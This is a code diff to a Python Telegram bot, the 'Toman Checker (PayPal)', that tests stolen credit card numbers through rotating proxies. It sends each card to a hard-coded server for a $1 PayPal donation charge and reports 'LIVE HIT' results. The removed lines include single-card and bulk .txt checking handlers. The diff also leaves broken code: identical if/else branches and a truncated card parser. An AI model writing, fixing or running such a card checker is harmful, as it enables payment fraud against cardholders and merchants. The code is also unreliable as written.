@@ -21,9 +21,23 @@ PROXIES = [
 
 def get_proxy():
     proxy_str = random.choice(PROXIES)
-    user, passw, host, port = proxy_str.split(':')
-    proxy_url = f"http://{user}:{passw}@{host}:{port}"
-    return {"http": proxy_url, "https": proxy_url}, proxy_str
+    parts = proxy_str.split(':')
+    
+    if len(parts) == 4:  # oxylabs format
+        host = parts[0]
+        port = parts[1]
+        user = parts[2]
+        password = parts[3]
+    else:  # other format
+        host = parts[0]
+        port = parts[1]
+        user = parts[2]
+        password = parts[3]
+    
+    proxy_url = f"http://{user}:{password}@{host}:{port}"
+    print(f"[{datetime.now().strftime('%H:%M:%S')}] PROXY SELECTED → {host}:{port}")
+    
+    return {"http": proxy_url, "https": proxy_url}, f"{host}:{port}"
 
 # ================== CHECKER WITH FULL LOGS ==================
 def pali(ccx):
@@ -33,7 +47,6 @@ def pali(ccx):
     proxy_dict, proxy_used = get_proxy()
     
     print(f"[{current_time}] CHECKING → {ccx}")
-    print(f"[{current_time}] PROXY USED → {proxy_used}")
     
     try:
         url = f"http://138.128.240.15:8025/paypal_donate?cc={ccx}"
@@ -43,17 +56,14 @@ def pali(ccx):
         text = r.text
         
         print(f"[{current_time}] STATUS CODE → {r.status_code}")
-        print(f"[{current_time}] FULL RESPONSE → {text[:500]}")
+        print(f"[{current_time}] RESPONSE → {text[:400]}")
         
         if "ORDER APPROVED" in text.upper() or "APPROVED" in text.upper() or "SUCCESS" in text.upper():
-            print(f"[{current_time}] ✅ LIVE HIT (CHARGE 1.00$)")
+            print(f"[{current_time}] ✅ LIVE HIT")
             return "CHARGE 1.00$"
-        elif "ORDER NOT APPROVED" in text.upper() or "DECLINED" in text.upper():
+        else:
             print(f"[{current_time}] ❌ DECLINED")
             return "DECLINED"
-        else:
-            print(f"[{current_time}] ⚠️ UNKNOWN RESPONSE")
-            return text[:150]
 
     except Exception as e:
         print(f"[{current_time}] ❌ ERROR: {e}")
@@ -75,118 +85,4 @@ def luhn_check(number: str) -> bool:
 
 def reg(cc: str):
     parts = [p for p in re.split(r'\D+', cc) if p]
-    if len(parts) >= 4:
-        pan = parts[0]
-        mm = parts[1].zfill(2)
-        yy = parts[2]
-        cvc = parts[3]
-        if not luhn_check(pan):
-            return None
-        return f"{pan}|{mm}|{yy}|{cvc}"
-    return None
-
-
-# ================== BOT ==================
-@bot.message_handler(commands=["start"])
-def handle_start(message):
-    mes = types.InlineKeyboardMarkup()
-    mes.add(types.InlineKeyboardButton(text="Start Checking", callback_data="start"))
-    bot.send_message(message.chat.id, f"Hi {message.from_user.first_name}, Welcome To Toman Checker (PayPal)", reply_markup=mes)
-
-
-@bot.callback_query_handler(func=lambda call: call.data == 'start')
-def handle_start_button(call):
-    bot.send_message(call.message.chat.id, "Welcome to PayPal Custom Checker\nUse /pp for single check or send .txt file")
-
-
-@bot.message_handler(func=lambda message: message.text and (message.text.lower().startswith('.pp') or message.text.lower().startswith('/pp')))
-def single_check(message):
-    ko = bot.reply_to(message, "Checking with Proxy...").message_id
-    try:
-        cc_text = message.reply_to_message.text if message.reply_to_message else message.text
-        cc = reg(cc_text)
-        if not cc:
-            return bot.edit_message_text("Invalid Card Format!", message.chat.id, ko)
-
-        last = pali(cc)
-        msg = f'''<strong>#PayPal_Custom 1.00$ 🔥
-- - - - - - - - - - - - - - - - - - - - - - -
-[<a href="https://t.me/B">ϟ</a>] 𝐂𝐚𝐫𝐝: <code>{cc}</code>
-[<a href="https://t.me/B">ϟ</a>] 𝐒𝐭𝐚𝐭𝐮𝐬: <code>{last}</code>
-- - - - - - - - - - - - - - - - - - - - - - -
-Checked by: @TomanSamurai</strong>'''
-
-        bot.edit_message_text(msg, message.chat.id, ko, parse_mode="HTML")
-
-    except Exception as e:
-        bot.edit_message_text(f"Error: {e}", message.chat.id, ko)
-
-
-@bot.message_handler(content_types=['document'])
-def handle_document(message):
-    if not message.document.file_name.endswith('.txt'):
-        return bot.reply_to(message, "Only .txt file allowed!")
-
-    user_id = str(message.from_user.id)
-    file_info = bot.get_file(message.document.file_id)
-    downloaded = bot.download_file(file_info.file_path)
-    filename = f"com{user_id}.txt"
-
-    with open(filename, "wb") as f:
-        f.write(downloaded)
-
-    bts = types.InlineKeyboardMarkup()
-    bts.add(types.InlineKeyboardButton(text='PayPal Custom 1.00$', callback_data='ottpa2'))
-    bot.reply_to(message, 'Select Gate:', reply_markup=bts)
-
-
-@bot.callback_query_handler(func=lambda call: call.data == 'ottpa2')
-def mass_check(call):
-    def checker():
-        user_id = str(call.from_user.id)
-        filename = f"com{user_id}.txt"
-        passs = 0
-        basl = 0
-
-        bot.edit_message_text("- Processing File with Proxy & Logs...", call.message.chat.id, call.message.message_id)
-
-        with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
-            lines = f.readlines()
-
-        total = len(lines)
-        stopuser.setdefault(user_id, {})['status'] = 'start'
-
-        for cc in lines:
-            if stopuser.get(user_id, {}).get('status') == 'stop':
-                bot.edit_message_text("✅ Stopped!", call.message.chat.id, call.message.message_id)
-                return
-
-            cc_clean = reg(cc.strip())
-            if not cc_clean:
-                continue
-
-            last = pali(cc_clean)
-
-            if "CHARGE" in last or "APPROVED" in last.upper():
-                passs += 1
-                bot.send_message(call.from_user.id, f"✅ Charged!\n{cc_clean}\n{last}")
-            else:
-                basl += 1
-
-            time.sleep(6)
-
-        bot.edit_message_text(f"✅ Done!\nApproved: {passs}\nDeclined: {basl}\nTotal: {total}", 
-                              call.message.chat.id, call.message.message_id)
-
-    threading.Thread(target=checker, daemon=True).start()
-
-
-@bot.callback_query_handler(func=lambda call: call.data == 'stop')
-def stop_check(call):
-    uid = str(call.from_user.id)
-    stopuser.setdefault(uid, {})['status'] = 'stop'
-    bot.answer_callback_query(call.id, "Stopped ✅")
-
-
-print("🚀 Bot Started with Proxy + Full Logs")
-bot.infinity_polling(none_stop=True)
+    if len(parts) >= 4
